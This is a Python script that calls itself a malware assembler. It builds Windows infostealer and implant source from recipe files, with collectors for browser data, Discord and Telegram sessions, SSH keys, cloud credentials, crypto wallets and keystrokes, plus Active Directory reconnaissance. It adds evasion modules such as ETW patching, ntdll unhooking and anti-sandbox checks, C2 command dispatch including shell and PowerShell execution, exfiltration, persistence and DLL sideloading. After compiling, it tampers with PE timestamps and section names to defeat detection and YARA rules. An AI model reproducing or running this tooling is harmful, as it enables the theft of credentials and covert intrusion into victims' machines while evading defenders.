#!/usr/bin/env python3
"""Assembles malware from chunk recipes.

Usage:
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c --compile
    python assembler.py recipes/keylogger.yaml -o /tmp/output.c --compile --var C2_IP=10.0.2.2

Reads a recipe YAML, resolves chunk dependencies, concatenates into a single
compilable .c file with proper ordering, and optionally compiles with MinGW.
"""

import argparse
import os
import re
import subprocess
import sys
from pathlib import Path

try:
    import yaml
except ImportError:
    print("pyyaml required: pip install pyyaml", file=sys.stderr)
    sys.exit(1)

CHUNKS_DIR = Path(__file__).parent

FN_MAP = {
    "collectors/system_info": "collect_system_info",
    "collectors/system_info_stealth": "collect_system_info",
    "collectors/system_info_api": "collect_system_info",
    "collectors/processes": "collect_processes",
    "collectors/processes_lolbin": "collect_processes",
    "collectors/installed_software": "collect_installed_software",
    "collectors/env_vars": "collect_env_vars",
    "collectors/env_vars_lolbin": "collect_env_vars",
    "collectors/clipboard": "collect_clipboard",
    "collectors/clipboard_lolbin": "collect_clipboard",
    "collectors/wifi_passwords": "collect_wifi",
    "collectors/browser_chromium": "collect_browsers",
    "collectors/discord_tokens": "collect_discord",
    "collectors/telegram_session": "collect_telegram",
    "collectors/ftp_credentials": "collect_ftp_clients",
    "collectors/ssh_keys": "collect_ssh_git",
    "collectors/cloud_creds": "collect_cloud_creds",
    "collectors/crypto_wallets": "collect_crypto_wallets",
    "collectors/screenshot": "collect_screenshot",
    "collectors/keylogger": "collect_keystrokes",
    "collectors/netinfo_lolbin": "collect_netinfo",
    "collectors/netinfo_api": "collect_netinfo",
    "collectors/active_windows": "collect_active_windows",
    "collectors/active_windows_lolbin": "collect_active_windows",
    "collectors/security_products": "collect_security_products",
    "collectors/drives": "collect_drives",
    "collectors/startup_items": "collect_startup_items",
    "collectors/recent_files": "collect_recent_files",
    "collectors/scheduled_tasks_recon": "collect_scheduled_tasks",
    "ad_collectors/ad_users": "collect_users",
    "ad_collectors/ad_groups": "collect_groups",
    "ad_collectors/ad_computers": "collect_computers",
    "ad_collectors/ad_domains": "collect_domains",
    "ad_collectors/ad_ous": "collect_ous",
    "ad_collectors/ad_gpos": "collect_gpos",
}


def parse_chunk_metadata(chunk_path: Path) -> dict:
    meta = {"depends": [], "provides": [], "headers": [], "libs": []}
    if not chunk_path.exists():
        return meta
    with open(chunk_path) as f:
        for line in f:
            line = line.strip()
            if not line.startswith("//"):
                break
            if line.startswith("// depends:"):
                deps = line.split(":", 1)[1].strip()
                if deps != "(none)":
                    meta["depends"] = [d.strip() for d in deps.split(",")]
            elif line.startswith("// provides:"):
                meta["provides"] = [p.strip() for p in line.split(":", 1)[1].strip().split(",")]
            elif line.startswith("// headers:"):
                hval = line.split(":", 1)[1].strip()
                if hval != "(none)":
                    meta["headers"] = [h.strip() for h in hval.split(",")]
            elif line.startswith("// libs:"):
                lval = line.split(":", 1)[1].strip()
                if lval != "(none)":
                    meta["libs"] = [l.strip() for l in lval.split(",")]
    return meta


def resolve_chunk_path(chunk_ref: str) -> Path:
    p = CHUNKS_DIR / f"{chunk_ref}.c"
    if p.exists():
        return p
    p = CHUNKS_DIR / f"{chunk_ref}.h"
    if p.exists():
        return p
    raise FileNotFoundError(f"Chunk not found: {chunk_ref} (tried {CHUNKS_DIR / chunk_ref}.[ch])")


def read_chunk_body(chunk_path: Path) -> str:
    lines = []
    in_body = False
    chunk_guard_depth = 0
    with open(chunk_path) as f:
        for line in f:
            stripped = line.strip()
            if not in_body:
                if stripped.startswith("//"):
                    continue
                in_body = True
            if stripped.startswith("#ifndef CHUNK_"):
                chunk_guard_depth += 1
                continue
            if stripped.startswith("#define CHUNK_"):
                continue
            lines.append(line)

    if chunk_guard_depth > 0 and lines and lines[-1].strip() == "#endif":
        lines.pop()
    while lines and lines[-1].strip() == "":
        lines.pop()
    while lines and lines[0].strip() == "":
        lines.pop(0)

    return "".join(lines)


def build_collector_calls(collectors: list[str]) -> str:
    calls = []
    for c in collectors:
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
    return "\n".join(calls)


def build_staged_calls(collectors: list[str]) -> str:
    calls = []
    for i, c in enumerate(collectors):
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        if i < len(collectors) - 1:
            calls.append(f"    jitter_sleep(1000, 5000);")
    return "\n".join(calls)


def build_paced_calls(collectors: list[str]) -> str:
    calls = []
    for i, c in enumerate(collectors):
        fn = FN_MAP.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        calls.append(f"    pace(300, 300);")
        if i % 2 == 0:
            calls.append(f"    decoy_work();")
    return "\n".join(calls)


def build_fn_list(collectors: list[str]) -> str:
    fns = []
    for c in collectors:
        fn = FN_MAP.get(c, c.split("/")[-1])
        fns.append(f"        (collector_fn){fn},")
    return "\n".join(fns)


EVASION_INIT_MAP = {
    "evasion/etw_patch": "    patch_etw();",
    "evasion/unhook_ntdll": "    unhook_ntdll();",
    "evasion/anti_debug": "    if (check_debugger()) return 1;",
    "evasion/anti_sandbox": "    if (check_sandbox()) return 1;",
    "evasion/anti_vm": "    if (check_vm()) return 1;",
    "evasion/hw_bp_etw": "    hwbp_etw_init();",
    "evasion/indirect_syscall": "    init_indirect_syscalls();",
    "evasion/sleep_encrypt": "",
    "evasion/header_stomp": "    stomp_pe_headers();",
    "evasion/elastic_gadget": "    init_elastic_gadget();",
    "evasion/self_delete": "    self_delete();",
    "evasion/process_masquerade": "    masquerade_process();",
    "evasion/entropy_pad": "    entropy_pad_ref();",
    "evasion/ret_spoof": "    init_ret_spoof();",
    "evasion/behavioral_pacing": "",
    "evasion/sleep_jitter": "",
    "evasion/aes_encrypt": "",
    "evasion/api_hash": "",
    "evasion/deferred_exec": "    deferred_wait();",
    "evasion/triggered_exec": "    wait_for_user_activity();",
    "evasion/stack_strings": "",
}


CMD_ID_MAP = {
    "commands/cmd_sysinfo": 0x02,
    "commands/cmd_sysinfo_lolbin": 0x02,
    "commands/cmd_processes": 0x03,
    "commands/cmd_processes_lolbin": 0x03,
    "commands/cmd_filelist": 0x04,
    "commands/cmd_fileread": 0x05,
    "commands/cmd_filewrite": 0x06,
    "commands/cmd_screenshot": 0x07,
    "commands/cmd_registry": 0x08,
    "commands/cmd_netinfo": 0x09,
    "commands/cmd_netinfo_lolbin": 0x09,
    "commands/cmd_exec": 0x0A,
    "commands/cmd_exec_powershell": 0x0B,
}


def build_command_dispatch(commands: list[str]) -> str:
    cases = []
    seen_ids = set()
    for cmd_ref in commands:
        cmd_id = CMD_ID_MAP.get(cmd_ref)
        if cmd_id is None or cmd_id in seen_ids:
            continue
        seen_ids.add(cmd_id)
        fn_name = cmd_ref.split("/")[-1]
        cases.append(f"                case 0x{cmd_id:02X}: rc = {fn_name}(cmd_buf, hdr.payload_len, out_buf, &out_len); break;")
    return "\n".join(cases)


def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    if recipe.get("api_resolve"):
        all_chunks.append(recipe["api_resolve"])
    all_chunks.extend(recipe.get("evasion", []))
    if recipe.get("process"):
        all_chunks.append(recipe["process"])
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    if recipe.get("c2"):
        all_chunks.append(recipe["c2"])
    all_chunks.extend(recipe.get("commands", []))
    if recipe.get("exfil"):
        all_chunks.append(recipe["exfil"])
    if recipe.get("persist"):
        all_chunks.append(recipe["persist"])
    all_chunks.append(recipe["arch"])

    seen_headers = set()
    all_headers = []
    all_libs = set()
    bodies = []

    for chunk_ref in all_chunks:
        path = resolve_chunk_path(chunk_ref)
        meta = parse_chunk_metadata(path)
        for h in meta["headers"]:
            if h not in seen_headers:
                seen_headers.add(h)
                all_headers.append(h)
        all_libs.update(meta["libs"])
        bodies.append(f"/* ── {chunk_ref} ── */\n")
        bodies.append(read_chunk_body(path))
        bodies.append("\n\n")

    base_headers = ["winsock2.h", "windows.h", "ws2tcpip.h", "stdio.h", "stdlib.h", "string.h", "stdarg.h"]
    final_headers = []
    for h in base_headers:
        if h not in seen_headers:
            seen_headers.add(h)
        final_headers.append(h)
    for h in all_headers:
        if h not in final_headers:
            final_headers.append(h)

    output_parts = []
    for h in final_headers:
        output_parts.append(f"#include <{h}>")
    output_parts.append("")

    output_parts.append("")

    evasion_list = recipe.get("evasion", [])
    if "evasion/sleep_encrypt" in evasion_list:
        output_parts.append("#define USE_OBF_SLEEP 1")

    _skip_define = {"C2_IP", "C2_PORT", "LDAP_USER", "LDAP_DOMAIN", "LDAP_PASS"}
    for k, v in vars_dict.items():
        if k not in _skip_define:
            output_parts.append(f"#define {k} {v}")
    output_parts.append("")

    source = "\n".join(output_parts) + "\n" + "".join(bodies)

    collectors = recipe.get("collectors", [])
    source = source.replace("{{COLLECTOR_CALLS}}", build_collector_calls(collectors))
    source = source.replace("{{STAGED_COLLECTOR_CALLS}}", build_staged_calls(collectors))
    source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
    source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))

    commands = recipe.get("commands", [])
    source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(commands))

    evasion_chunks = recipe.get("evasion", [])
    evasion_init_lines = [EVASION_INIT_MAP[e] for e in evasion_chunks if e in EVASION_INIT_MAP and EVASION_INIT_MAP[e]]
    source = source.replace("{{EVASION_INIT}}", "\n".join(evasion_init_lines) if evasion_init_lines else "")

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source


def stomp_pe_timestamp(exe_path: str) -> None:
    """Overwrite PE TimeDateStamp with a plausible old date to defeat 'recently compiled' heuristics."""
    import struct
    import random
    try:
        with open(exe_path, "r+b") as f:
            if f.read(2) != b"MZ":
                return
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off)
            if f.read(4) != b"PE\x00\x00":
                return
            ts_off = pe_off + 8
            old_ts = random.randint(1577836800, 1672531200)
            f.seek(ts_off)
            f.write(struct.pack("<I", old_ts))
    except (OSError, struct.error):
        pass


def randomize_section_names(exe_path: str) -> None:
    """Rename PE section names to random strings. Defeats YARA rules matching on .text/.data/.rdata."""
    import struct
    import random
    import string
    try:
        with open(exe_path, "r+b") as f:
            if f.read(2) != b"MZ":
                return
            f.seek(0x3C)
            pe_off = struct.unpack("<I", f.read(4))[0]
            f.seek(pe_off)
            if f.read(4) != b"PE\x00\x00":
                return
            # COFF header: Machine(2), NumberOfSections(2), ...
            f.seek(pe_off + 6)
            num_sections = struct.unpack("<H", f.read(2))[0]
            f.seek(pe_off + 20)
            opt_hdr_size = struct.unpack("<H", f.read(2))[0]
            section_table_off = pe_off + 24 + opt_hdr_size
            chars = string.ascii_letters + string.digits
            for i in range(num_sections):
                sec_off = section_table_off + i * 40
                f.seek(sec_off)
                old_name = f.read(8)
                # Generate random 4-6 char name with . prefix
                name_len = random.randint(3, 6)
                new_name = "." + "".join(random.choice(chars) for _ in range(name_len))
                new_name_bytes = new_name.encode("ascii").ljust(8, b"\x00")
                f.seek(sec_off)
                f.write(new_name_bytes)
    except (OSError, struct.error):
        pass


def compile_mingw(source_path: str, output_path: str, dll_def: str | None = None) -> bool:
    is_dll = dll_def is not None
    if is_dll and not output_path.endswith(".dll"):
        output_path = output_path.rsplit(".", 1)[0] + ".dll"
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-mwindows",
        f"-I{CHUNKS_DIR / 'process'}",
        f"-I{CHUNKS_DIR / 'evasion'}",
        f"-I{CHUNKS_DIR / 'api_resolve'}",
        f"-I{CHUNKS_DIR}",
    ]
    if is_dll:
        cmd.append("-shared")
    cmd.extend(["-o", output_path, source_path])
    if is_dll and dll_def:
        cmd.append(dll_def)
    cmd.extend([
        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
        "-lwininet", "-lwinhttp", "-ldnsapi", "-ladvapi32", "-luser32",
        "-lwldap32", "-lnetapi32", "-lmpr",
        "-static", "-s", "-Wl,--strip-all",
    ])
    if is_dll:
        cmd.append("-Wl,--enable-stdcall-fixup")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"Compile error:\n{result.stderr}", file=sys.stderr)
            return False
        stomp_pe_timestamp(output_path)
        randomize_section_names(output_path)
        size = os.path.getsize(output_path)
        print(f"Compiled: {output_path} ({size} bytes)")
        return True
    except FileNotFoundError:
        print("x86_64-w64-mingw32-gcc not found", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(description="Assemble malware from chunk recipes")
    parser.add_argument("recipe", help="Path to recipe YAML file")
    parser.add_argument("-o", "--output", default="/tmp/assembled.c", help="Output .c file path")
    parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
    parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")

    args = parser.parse_args()

    extra_vars = {}
    for v in args.var:
        if "=" in v:
            k, val = v.split("=", 1)
            extra_vars[k] = val

    source = assemble(args.recipe, extra_vars)

    with open(args.output, "w") as f:
        f.write(source)
    print(f"Assembled: {args.output} ({len(source)} chars)")

    if args.compile:
        with open(args.recipe) as rf:
            recipe_data = yaml.safe_load(rf)
        arch = recipe_data.get("arch", "")
        if arch == "arch/dll_sideload":
            dll_def_name = recipe_data.get("def_file", "version.def")
            dll_def = str(CHUNKS_DIR / "arch" / dll_def_name)
            out_path = args.output.replace(".c", ".dll")
            compile_mingw(args.output, out_path, dll_def=dll_def)
        else:
            exe_path = args.output.replace(".c", ".exe")
            compile_mingw(args.output, exe_path)


if __name__ == "__main__":
    main()
